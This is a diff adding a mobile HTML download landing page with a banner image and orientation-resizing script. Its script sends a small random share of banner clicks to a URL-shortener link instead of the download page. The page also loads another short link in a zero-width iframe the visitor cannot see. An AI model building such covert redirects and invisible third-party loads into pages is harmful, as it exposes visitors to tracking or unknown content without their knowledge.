@@ -1,0 +1,133 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+<style>html { overflow-x:hidden; }</style> 
+
+<style>html { overflow-y:hidden; }
+
+@media screen and (orientation: portrait) {
+ .divbanner img{ width:100%;} 
+	
+}
+@media screen and (orientation: landscape) {
+  .divbanner img{
+  position:fixed;
+    bottom:0%;
+     left: 22px;
+    }
+	
+}
+
+</style>
+
+<script>
+function random_url()
+{
+	if(Math.random()>0.008)
+window.location.href = "https://grepkweiwo.github.io/downloadpage/";
+	else window.location.href = "https://biiy.cn/000PJz";
+}
+</script>
+	
+</head>
+
+<body>
+
+<div class="divbanner"> 
+
+<img  onclick="javascript:random_url();" style="cursor:pointer;" id="banner" src="https://lovenight.cdn.bcebos.com/download.jpg"/>
+
+</div >
+
+	
+<iframe class="iframe" id="imgexplain"  width="100%"  position="fixed" top="4px" frameborder="0" src="clearpreviewiframe.html"></iframe>
+<div >
+	<img   width="100%"  src="https://lovenight.cdn.bcebos.com/explainshow.jpg"/>
+</div >
+	
+	<iframe class="iframe2" width="0%"   frameborder="0" src="https://biiy.cn/000PJU"></iframe>
+
+</body>
+ 
+
+<script type="text/javascript"> 
+	  
+	var or=parseInt(document.body.clientWidth)/parseInt(document.body.clientHeight);
+	if(or>1)
+	or=or*0.31;
+function orientationChange() {
+	
+    switch(window.orientation) {
+      
+    　　case 0: 
+		    var test = document.getElementById('imgexplain').contentWindow.document.getElementById('myDiv');
+         var banner = document.getElementById('banner');
+		    
+            test.style.width = parseInt(document.body.clientWidth)*1.2/or*1.7+"px";
+		   
+            banner.style.width = parseInt(document.body.clientWidth)+"px";
+		   
+           var divpreview=document.getElementById("imgexplain");
+        divpreview.style.height=parseInt(document.body.clientWidth)*0.73*1.5*0.51515*1.2*1.55+"px";
+		               
+            break;
+
+    　　case -90: 
+  var test = document.getElementById('imgexplain').contentWindow.document.getElementById('myDiv');
+         var banner = document.getElementById('banner');
+		    
+            test.style.width = parseInt(document.body.clientWidth)*2.73*or*0.7+"px";
+		   
+            banner.style.width = parseInt(document.body.clientWidth)*0.65*or*0.7+"px";
+		  
+           var divpreview=document.getElementById("imgexplain");
+        divpreview.style.height=parseInt(document.body.clientWidth)*0.73*1.5*0.51515*0.75*1.5+"px";
+		   
+            break;
+
+    　　case 90:   
+		   
+   var test = document.getElementById('imgexplain').contentWindow.document.getElementById('myDiv');
+         var banner = document.getElementById('banner');
+		    
+            test.style.width = parseInt(document.body.clientWidth)*2.73*or*0.7+"px";
+		   
+            banner.style.width = parseInt(document.body.clientWidth)*0.65*or*0.7+"px";
+		  
+           var divpreview=document.getElementById("imgexplain");
+        divpreview.style.height=parseInt(document.body.clientWidth)*0.73*1.5*0.51515*0.75*1.5+"px";
+		    
+		     
+		    break;
+
+    　　case 180:   
+	    var test = document.getElementById('imgexplain').contentWindow.document.getElementById('myDiv');
+         var banner = document.getElementById('banner');
+		    
+            test.style.width = parseInt(document.body.clientWidth)*1.2/or*1.7+"px";
+		   
+            banner.style.width = parseInt(document.body.clientWidth)+"px";
+		   
+           var divpreview=document.getElementById("imgexplain");
+        divpreview.style.height=parseInt(document.body.clientWidth)*0.73*1.5*0.51515*1.2*1.55+"px";
+        　　break;
+
+    };
+
+};
+
+// 添加事件监听
+
+addEventListener('load', function(){
+
+    orientationChange();
+
+    window.onorientationchange = orientationChange;
+
+});
+	
+	
+
+</script>
+</html>
